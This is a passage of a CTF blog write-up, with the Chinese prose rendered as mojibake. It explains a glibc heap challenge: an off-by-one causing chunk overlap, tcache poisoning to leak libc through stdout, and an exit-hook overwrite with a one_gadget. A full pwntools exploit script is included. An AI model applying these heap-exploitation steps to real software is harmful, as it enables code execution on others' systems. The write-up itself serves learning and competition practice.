<p>æ­¤å¤–ï¼Œexitå‡½æ•°å±äºlibcå‡½æ•°ï¼Œåç§»å¯ä»¥è®¡ç®—å‡ºæ¥ï¼Œå› æ­¤æˆ‘ä»¬èƒ½æœ‰åŠæ³•å¾—åˆ°finiå‡½æ•°è°ƒç”¨çš„ä¸¤ä¸ªå‡½æ•°ä½ç½®ï¼Œå†é€šè¿‡ç”³è¯·chunkåˆ°è¿™ä¸ªåœ°å€ä¸Šï¼Œå°±èƒ½ä¿®æ”¹å‡½æ•°æŒ‡é’ˆä½¿å…¶æŒ‡å‘æˆ‘ä»¬æœ€â™¥çš„onegadgetæˆ–è€…systemã€‚</p>
<p>å¦‚æœè¦é€šè¿‡æ”¹æˆsystemæ¥getshellï¼Œå°±å¾—æ§åˆ¶GLï¼ˆdl_load_lockï¼‰è¿™ä¸€ä¼ å‚ã€‚gdb è·Ÿè¿›ä¼šå‘ç°ï¼Œå®ƒå…¶å®æ˜¯ç»“æ„ä½“_rtld_globalçš„ä¸€éƒ¨åˆ†ï¼Œ_rtld_global._dl_load_lock.mutex.__sizeçš„åœ°å€ã€‚</p>
<h2 id="ä¸‰ã€ä¾‹é¢˜-DASCTF-x-MAY-å±±é‡æ°´å¤"><a href="#ä¸‰ã€ä¾‹é¢˜-DASCTF-x-MAY-å±±é‡æ°´å¤" class="headerlink" title="ä¸‰ã€ä¾‹é¢˜ DASCTF x MAY å±±é‡æ°´å¤"></a>ä¸‰ã€ä¾‹é¢˜ DASCTF x MAY å±±é‡æ°´å¤</h2><h4 id="ä¸€äº›bbll"><a href="#ä¸€äº›bbll" class="headerlink" title="ä¸€äº›bbll"></a>ä¸€äº›bbll</h4><p>åˆæ˜¯ä¸€æœˆä¸€åº¦çš„DASï¼Œåªèƒ½è¯´çœ‹ç€uuuå¸ˆå‚…akï¼Œåªèƒ½è†œæ‹œorzã€‚</p>
<p>è¿™ä¸ªé¢˜èµ›ä¸­åäºŒç‚¹å°±æœ‰æ€è·¯äº†ï¼Œä½†æ˜¯è¿™ä¸ªoffbyoneå®¡è®¡ä»£ç çš„æ—¶å€™è§‰å¾—æœ‰ï¼Œä½†æ˜¯ä¸Šæ‰‹è°ƒä¸€æŠŠä¹‹åå‘ç°æ²¡æœ‰chunk overlapçš„ç°è±¡ï¼Œå°±ä»¥ä¸ºæ˜¯æˆ‘è‡ªå·±å®¡é”™äº†ï¼Œç„¶åæŠ˜ç£¨äº†è‡ªå·±å¥½ä¹…ï¼Œæœ€åéšæ‰‹ç”³è¯·äº†sizeä¸º6çš„å †å—ï¼Œè¾“å…¥äº†7ä¸ªaï¼Œgdbè¿›å»ä¸€çœ‹æ˜¯7ä¸ªï¼Œæ‰å‘ç°çœŸæœ‰off by oneï¼Œæ˜¯æˆ‘ç”³è¯·çš„sizeä¸å¯¹ï¼ˆè¦8ç»“å°¾çš„sizeï¼‰ï¼Œæ²¡æœ‰å¤ç”¨åˆ°presizeï¼Œå¯¼è‡´æ²¡æœ‰chunk overlapï¼ˆè¿˜æ˜¯å¤ªèœäº†</p>
<h4 id="ä»£ç åˆ†æ"><a href="#ä»£ç åˆ†æ" class="headerlink" title="ä»£ç åˆ†æ"></a>ä»£ç åˆ†æ</h4><p><a target="_blank" rel="noopener" href="https://imgtu.com/i/XEWkJH"><img src="https://s1.ax1x.com/2022/05/26/XEWkJH.png" alt="XEWkJH.png"></a></p>
<p>ç»å…¸èœå•åˆ—è¡¨ï¼Œç»™äº†ä¸€ä¸ªæ‰‹åŠ¨è°ƒç”¨exitçš„æœºä¼šï¼Œä½†æ˜¯æ²¡æœ‰è¾“å‡ºå †å—å†…å®¹çš„å‡½æ•°ï¼Œæ‰€ä»¥å°±æƒ³åˆ°åº”è¯¥æ˜¯æ‰“stdoutæ³„éœ²åœ°å€ï¼Œæ‰“exit hookå»getshellã€‚</p>
<p>ä½†æ˜¯ä¸ºå•¥æˆ‘ä»¬ä¸å»é€‰æ‹©æˆ‘ä»¬çš„è€ç›¸å¥½malloc_hookæˆ–è€…free_hookå‘¢ï¼ŒåŸå› åœ¨äºä»–æ¯ä¸€æ¬¡é€‰æ‹©å®Œåéƒ½ä¼šè°ƒç”¨ä¸€æ¬¡checkå‡½æ•°</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/XEW0kF"><img src="https://s1.ax1x.com/2022/05/26/XEW0kF.png" alt="XEW0kF.png"></a></p>
<p>è€Œåœ¨è¿™ä¸ªcheckå‡½æ•°é‡Œé¢ï¼Œæˆ‘ä»¬çš„è€ç›¸å¥½è¢«killäº†<a target="_blank" rel="noopener" href="https://imgtu.com/i/XEWylR"><img src="https://s1.ax1x.com/2022/05/26/XEWylR.png" alt="XEWylR.png"></a></p>
<p>åœ¨editå‡½æ•°é‡Œï¼Œä»–å†™å…¥æ•°æ®çš„å‡½æ•°æ˜¯è‡ªå·±å®šä¹‰çš„ä¸€ä¸ªmy_readï¼ˆè¿™ä¸€çœ‹å°±æœ‰é—®é¢˜</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/XEWopd"><img src="https://s1.ax1x.com/2022/05/26/XEWopd.png" alt="XEWopd.png"></a></p>
<p>å­˜åœ¨off by one</p>
<h4 id="åˆ©ç”¨é€»è¾‘"><a href="#åˆ©ç”¨é€»è¾‘" class="headerlink" title="åˆ©ç”¨é€»è¾‘"></a>åˆ©ç”¨é€»è¾‘</h4><p>é¦–å…ˆå› ä¸ºtcacheçš„å­˜åœ¨ï¼Œæˆ‘ä»¬æƒ³è¦åˆ©ç”¨unsorted binçš„è¯ï¼Œè¦ä¹ˆå¡«æ»¡tcacheï¼Œè¦ä¹ˆç”³è¯·ä¸€ä¸ªå¤§äº0x420çš„å †å—ã€‚è¿™é‡Œæˆ‘ä»¬é‡‡ç”¨ç¬¬äºŒç§æ–¹æ³•ï¼Œäºæ­¤åŒæ—¶ï¼Œå› ä¸ºoff by oneå†™ä¸è¿›ä¸‰ä½ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬é‡‡ç”¨çš„æ–¹æ³•æ˜¯ç”¨chunk0å»æ”¹å†™chunk1çš„sizeï¼Œè®©chunk1åŒ…å«chunk2ï¼Œåˆ©ç”¨chunk1å»ä¿®æ”¹chunk2çš„sizeè¾¾åˆ°ç›®çš„</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0xb8</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x68</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x68</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x38</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x38</span>)<span class="comment">#5</span></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x400</span>)<span class="comment">#6</span></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x10</span>)<span class="comment">#7</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xb8</span>+p8(<span class="number">0xe1</span>))<span class="comment">#2 3overlap</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#add(1,0x68)</span></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0xd8</span>)<span class="comment">#2 control 3</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x68</span>+p64(<span class="number">0x501</span>)+<span class="string">b&#x27;\n&#x27;</span>)<span class="comment">#3-&gt;430</span></span><br></pre></td></tr></table></figure>

<p>ç„¶åæˆ‘ä»¬é‡Šæ”¾æ‰chunk2ï¼Œè®©2å¸¦ç€3ã€4ã€5ï¼Œä¸€èµ·æ»šè¿›å»unsorted bin</p>
<p>æ­¤æ—¶é‡Šæ”¾æ‰4ï¼Œ5ï¼Œè®©å…¶è¿›å…¥tcacheï¼Œä¸ºunsorted binçš„fdèƒ½å˜æˆtcacheçš„nextæŒ‡é’ˆåšå‡†å¤‡</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dele(<span class="number">2</span>)<span class="comment">#3 getin unsorted</span></span><br><span class="line">dele(<span class="number">4</span>)<span class="comment">#getin tcache</span></span><br><span class="line">dele(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæœ‰ä¸€ä¸ªå°ç»†èŠ‚ï¼Œæˆ‘ä»¬å…ˆdeleï¼ˆ4ï¼‰å†deleï¼ˆ3ï¼‰ï¼Œå› ä¸ºæˆ‘ä»¬è¯´è¿‡ï¼Œtcacheä¼šæœ‰countsä½è®°å½•å½“å‰é“¾è¡¨æœ‰å‡ ä¸ªchunkï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆæ”¾å¤šä¸€ä¸ªè¿›å»ï¼Œè®©å®ƒçš„countsä¸º2ï¼Œç„¶åç”¨3è¿™ä¸ªå †å—å»æ¥unsorted binçš„fdï¼Œè¿™æ ·å°±èƒ½ç”³è¯·å‡ºæ¥fake_chunk</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/XEocXd"><img src="https://s1.ax1x.com/2022/05/26/XEocXd.png" alt="XEocXd.png"></a></p>
<p>æœ€åæˆ‘ä»¬å†ç”³è¯·ä¸€ä¸ª0x2çš„å°å †å—ï¼Œå†æ¬¡åˆ‡å‰²unsorted binï¼Œæ­¤æ—¶æˆ‘ä»¬ç¼–è¾‘è¿™ä¸ªå°å †å—å°±èƒ½ä¿®æ”¹ä¸¤ä¸ªå­—èŠ‚ï¼Œå¹¶ä¸”è¿™ä¸ªå †å—ä¹Ÿåœ¨tcacheé‡Œï¼ˆå› ä¸ºåˆšåˆšæˆ‘ä»¬æ˜¯é€šè¿‡freeæ‰æœ¬æ¥å­˜åœ¨çš„3ï¼Œè®©å…¶è¿›å…¥tcacheï¼Œè€Œ3æœ¬æ¥å°±åœ¨ä¼ªé€ çš„å¤§chunké‡Œé¢ï¼Œæ‰€ä»¥æˆ‘ä»¬ç”³è¯·0x20ï¼Œå°±ä¼šå»åˆ‡å‰²unsorted ï¼Œåˆ†é…ç»™æˆ‘ä»¬è¿™å—è¿›å…¥äº†tcacheçš„å†…å­˜ï¼Œè¾¾åˆ°ç±»ä¼¼UAFçš„æ•ˆæœï¼‰ï¼Œå› æ­¤å°±èƒ½å¤Ÿä¿®æ”¹è¿™ä¸ªæ®‹ç•™çš„fdå»æ’stdoutç»“æ„ä½“ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">3</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">2</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">edit(<span class="number">4</span>,<span class="string">b&#x27;\xa0\xb6&#x27;</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x30</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x30</span>)</span><br><span class="line">edit(<span class="number">8</span>,p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00\n&#x27;</span>)</span><br><span class="line">libc=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p>ç„¶åå†åˆ©ç”¨ä¸€æ¬¡tcache poisoningå»ç”³è¯·åˆ°exit hookï¼Œå¡«ä¸Šone gadget</p>
<h4 id="å®Œæ•´expï¼š"><a href="#å®Œæ•´expï¼š" class="headerlink" title="å®Œæ•´expï¼š"></a>å®Œæ•´expï¼š</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=process(<span class="string">&#x27;./no&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,27829)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./no&#x27;</span>)</span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">choice</span>):</span><br><span class="line">   p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="built_in">str</span>(choice))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params"><span class="built_in">id</span>,size</span>):</span><br><span class="line">   menu(<span class="number">1</span>)</span><br><span class="line">   sleep(<span class="number">0.1</span>)</span><br><span class="line">   p.sendlineafter(<span class="string">&#x27;Idx:&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">   sleep(<span class="number">0.1</span>)</span><br><span class="line">   p.sendlineafter(<span class="string">&#x27;Size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params"><span class="built_in">id</span>,content</span>):</span><br><span class="line">   menu(<span class="number">2</span>)</span><br><span class="line">   p.sendlineafter(<span class="string">&#x27;Idx:&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">   p.sendafter(<span class="string">&#x27;context:&#x27;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">   menu(<span class="number">3</span>)</span><br><span class="line">   p.sendlineafter(<span class="string">&#x27;Idx:&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit</span>():</span><br><span class="line">   menu(<span class="number">4</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0xb8</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x68</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x68</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x38</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x38</span>)<span class="comment">#5</span></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x400</span>)<span class="comment">#6</span></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x10</span>)<span class="comment">#7</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xb8</span>+p8(<span class="number">0xe1</span>))<span class="comment">#2 3overlap</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#add(1,0x68)</span></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0xd8</span>)<span class="comment">#2 control 3</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x68</span>+p64(<span class="number">0x501</span>)+<span class="string">b&#x27;\n&#x27;</span>)<span class="comment">#3-&gt;430</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">2</span>)<span class="comment">#3 getin unsorted</span></span><br><span class="line">dele(<span class="number">4</span>)<span class="comment">#getin tcache</span></span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">2</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">edit(<span class="number">4</span>,<span class="string">b&#x27;\xa0\xb6&#x27;</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x30</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x30</span>)</span><br><span class="line">edit(<span class="number">8</span>,p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00\n&#x27;</span>)</span><br><span class="line">libc=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">one_gadget=[<span class="number">0xe6c7e</span>,<span class="number">0xe3b2e</span>,<span class="number">0xe3b31</span>,<span class="number">0xe3b34</span>,<span class="number">0xe3d23</span>,<span class="number">0xe3d26</span>,<span class="number">0xe3d99</span>,<span class="number">0xe3de5</span>,<span class="number">0xe3ded</span>]</span><br><span class="line">libc_base=libc-<span class="number">0x1eb980</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#dele()</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc))</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(hex(base))</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x18</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p8(<span class="number">0x41</span>))</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x30</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">off_set=<span class="number">0x222f68</span></span><br><span class="line">fake_next=libc_base+off_set</span><br><span class="line"><span class="comment">#fake_next=0x7ffff7ffdf70</span></span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)+p64(fake_next)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x18</span>)</span><br><span class="line">one=libc_base+one_gadget[<span class="number">0</span>]</span><br><span class="line">edit(<span class="number">2</span>,p64(one)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">menu(<span class="number">4</span>)</span><br><span class="line"><span class="comment">#add(2,0x30)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="å››ã€åˆæ˜¯ä¸€äº›ç¢ç¢å¿µ"><a href="#å››ã€åˆæ˜¯ä¸€äº›ç¢ç¢å¿µ" class="headerlink" title="å››ã€åˆæ˜¯ä¸€äº›ç¢ç¢å¿µ"></a>å››ã€åˆæ˜¯ä¸€äº›ç¢ç¢å¿µ</h3><p>æ‰“å®Œdasä¹‹åçš„ç¬¬äºŒå¤©çœèµ›ï¼Œåˆæ˜¯off by oneâ€¦æˆ‘åªèƒ½æŠŠexpå†™åˆ°åŠ«æŒfree_hookï¼Œå› ä¸ºå¼€äº†æ²™ç®±ï¼Œè€Œæˆ‘åˆå¯¹orwä¸€çªä¸é€šï¼Œåªèƒ½ä¸¢ç»™å¸ˆå…„ï¼Œè‡ªå·±åœ¨ä¸€æ—åç‰¢ã€‚</p>
<p>ç°åœ¨é€æ¸åˆæœ‰äº†pwnçš„åŠ¨åŠ›äº†ï¼Œfå¸ˆå‚…å’Œgå¸ˆå‚…éƒ½é‚£ä¹ˆçŒ›ï¼Œæˆ‘ä¸èƒ½è½ä¸‹ï¼Œä¸¢äº†äºŒè¿›åˆ¶å†²åˆ†å°é˜Ÿçš„è„¸orzã€‚æ­¤å¤–ç‰¹åˆ«é¸£è°¢æˆ‘çš„å¶åƒuuuå¸ˆå‚…ï¼Œèƒ½è®¤è¯†uuuå¸ˆå‚…çœŸçš„å¾ˆå¼€å¿ƒæ</p>
<p>æ¥ä¸‹æ¥å°±æ˜¯å‡†å¤‡ä¸‹æœŸæœ«è€ƒï¼Œäº‰å–ä¸æŒ‚ç§‘çš„åŒæ—¶æ‘¸æ‘¸ctfï¼Œææä½œå“èµ›</p>
<p><strong>hustle every day</strong></p>

    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/pwn/" rel="tag"># pwn</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2022/04/20/%E8%BF%91%E6%97%A5%E5%AD%A6%E4%B9%A0%E7%A2%8E%E7%89%87/" rel="prev" title="ä»Šæ—¥å­¦ä¹ ç¢ç‰‡">
      <i class="fa fa-chevron-left"></i> ä»Šæ—¥å­¦ä¹ ç¢ç‰‡
    </a></div>
      <div class="post-nav-item">
    <a href="/2022/07/20/Game%5B1%5D%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bwp-pwn/" rel="next" title="Game[1]è“å¸½æ¯åˆèµ›wp-pwn">
      Game[1]è“å¸½æ¯åˆèµ›wp-pwn <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          æ–‡ç« ç›®å½•
        </li>
        <li class="sidebar-nav-overview">
          ç«™ç‚¹æ¦‚è§ˆ
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">ä¸€ã€å‰è¨€</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E5%81%9A%E9%A2%98%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-number">2.</span> <span class="nav-text">äºŒã€åšé¢˜å‰ç½®çŸ¥è¯†</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1%E3%80%81%E5%85%B3%E4%BA%8EIO-FILE"><span class="nav-number">2.1.</span> <span class="nav-text">1ã€å…³äºIO FILE</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%9D%E8%AF%86IO-FILE"><span class="nav-number">2.1.1.</span> <span class="nav-text">åˆè¯†IO FILE</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E6%89%BE%E5%88%B0stdout%E7%9A%84%E4%BD%8D%E7%BD%AE"><span class="nav-number">2.1.2.</span> <span class="nav-text">å¦‚ä½•æ‰¾åˆ°stdoutçš„ä½ç½®</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#what%E2%80%99s-%E6%AE%8B%E7%95%99%E7%9A%84fd%E6%8C%87%E9%92%88"><span class="nav-number">2.1.3.</span> <span class="nav-text">whatâ€™s æ®‹ç•™çš„fdæŒ‡é’ˆ</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2%E3%80%81%E5%85%B3%E4%BA%8Etcache"><span class="nav-number">2.2.</span> <span class="nav-text">2ã€å…³äºtcache</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#tcache%E7%BB%93%E6%9E%84%E4%BD%93"><span class="nav-number">2.2.1.</span> <span class="nav-text">tcacheç»“æ„ä½“</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#tcache%E7%9A%84%E6%94%BB%E5%87%BB%E6%89%8B%E6%AE%B5"><span class="nav-number">2.2.2.</span> <span class="nav-text">tcacheçš„æ”»å‡»æ‰‹æ®µ</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3%E3%80%81%E5%85%B3%E4%BA%8Eexit-hook"><span class="nav-number">2.3.</span> <span class="nav-text">3ã€å…³äºexit hook</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E4%BE%8B%E9%A2%98-DASCTF-x-MAY-%E5%B1%B1%E9%87%8D%E6%B0%B4%E5%A4%8D"><span class="nav-number">3.</span> <span class="nav-text">ä¸‰ã€ä¾‹é¢˜ DASCTF x MAY å±±é‡æ°´å¤</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%80%E4%BA%9Bbbll"><span class="nav-number">3.0.1.</span> <span class="nav-text">ä¸€äº›bbll</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="nav-number">3.0.2.</span> <span class="nav-text">ä»£ç åˆ†æ</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E9%80%BB%E8%BE%91"><span class="nav-number">3.0.3.</span> <span class="nav-text">åˆ©ç”¨é€»è¾‘</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%8C%E6%95%B4exp%EF%BC%9A"><span class="nav-number">3.0.4.</span> <span class="nav-text">å®Œæ•´expï¼š</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9B%9B%E3%80%81%E5%8F%88%E6%98%AF%E4%B8%80%E4%BA%9B%E7%A2%8E%E7%A2%8E%E5%BF%B5"><span class="nav-number">3.1.</span> <span class="nav-text">å››ã€åˆæ˜¯ä¸€äº›ç¢ç¢å¿µ</span></a></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">A2ur2</p>
  <div class="site-description" itemprop="description">åœ¨æˆä¸ºå¤§èµ›pwné¢˜ç­¾åˆ°å‘˜çš„è·¯ä¸Š</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">8</span>
          <span class="site-state-item-name">æ—¥å¿—</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">3</span>
        <span class="site-state-item-name">æ ‡ç­¾</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

